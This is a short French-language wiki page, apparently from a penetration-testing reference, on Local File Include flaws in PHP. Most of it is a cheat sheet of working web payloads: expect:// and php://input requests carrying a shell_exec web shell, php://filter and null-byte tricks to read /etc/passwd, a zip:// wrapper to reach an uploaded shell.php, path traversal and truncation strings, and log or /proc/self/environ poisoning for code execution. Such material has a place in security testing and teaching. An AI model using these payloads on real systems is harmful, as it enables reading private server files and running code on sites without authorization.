---
title: Local File Include
permalink: /Local_File_Include/
---

Une faille de type Local File Include (LFI) consiste à inclure un fichier local à partir d'une entrée utilisateur. Dans certains cas ceci permet d'accéder à des fichiers non situés dans le webroot voire d'executer du code.

PHP
---

### PHP Wrappers

Il y a plusieurs "Wrappers" en PHP qui peuvent être utilisés pour exploiter des LFI.

-   PHP expect wrapper (désactivé par défaut):

``` text
target.php?page=expect://ls
```

-   PHP input wrapper:

``` text
POST /target.php?page=php:/input&cmd=ls
[..]
Content-Length: 44

<?php echo shell_exec($_GET['cmd']);?>
```

-   PHP php://filter (permet d'inclure un fichier et l'encoder en base64. Ceci permet de lire du code PHP:

``` text
vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

-   PHP php://filter sans base64:

``` text
vuln.php?page=php://filter/resource=/etc/passwd
```

-   PHP ZIP Wrapper LFI (à condition d'avoir uploadé un zip contenant le payload). Le zip sera décompressé dans shell.php:

``` text
vuln.php?page=zip://path/to/file.zip%23shell.php
```

### Divers

Il est possible d'inclure certains fichiers qui peuvent contenir des entrées utilisateurs si on veut executer du code (ex: User-Agent, etc.):

-   /proc/self/environ
-   Logs Apache
-   Emails (on peut essayer d'énumerer les utilisateurs locaux avec VRFY)

Technique du Null byte (ne fonctionne pas sur les versions récentes de PHP:

``` text
vuln.php?page=/etc/passwd%00
vuln.php?page=/etc/passwd%2500
```

L'injection de loooongues valeurs peut permettre de bypasser certains filtres si on a des truncate:

``` text
vuln.php?page=/etc/passwd.................................................................................
vuln.php?page=../../../../../../../../../../../../../../../../../../../../etc/passwd
vuln.php?page=/etc/passwd/../../../../../../../../../../../../../../../../../../../..
```

[Category:Web](/Category:Web "wikilink") [Category:Exploitation](/Category:Exploitation "wikilink")
